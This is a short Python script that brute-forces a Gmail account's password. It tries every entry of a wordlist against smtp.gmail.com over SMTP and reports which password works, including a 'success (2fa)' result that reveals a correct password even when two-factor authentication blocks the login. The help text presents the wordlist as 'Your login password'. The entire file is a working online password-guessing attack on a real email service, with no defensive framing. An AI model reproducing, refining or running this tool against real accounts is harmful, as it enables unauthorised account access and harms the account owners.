#!/usr/bin/python3

import smtplib, argparse, os, sys

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument("-e", "--email", type=str, required=True, help="Your login email.")
  parser.add_argument("-w", "--wordlist", type=str, required=True, help="Your login password.")
  args = parser.parse_args()

  email = args.email
  wordlist = args.wordlist

  if not os.path.isfile(wordlist):
    print("No such file.")
    sys.exit(1)

  server = smtplib.SMTP("smtp.gmail.com", 587)
  server.ehlo()
  server.starttls()

  with open(wordlist) as fp:
    lines = fp.readlines()
    for line in lines:
      pwd = line.strip()
      try:
        server.login(email, pwd)
        print("{}:{}".format(email, pwd), "success")
        break
      except smtplib.SMTPAuthenticationError as e:
        msg = repr(e)
        if "BadCredentials" in msg:
          print("{}:{}".format(email, pwd), "failure")
        elif "SecondFactor" in msg:
          print("{}:{}".format(email, pwd), "success (2fa)")
          break
        else:
          print("{}:{}".format(email, pwd), msg)

  server.quit()

if __name__ == "__main__":
  main()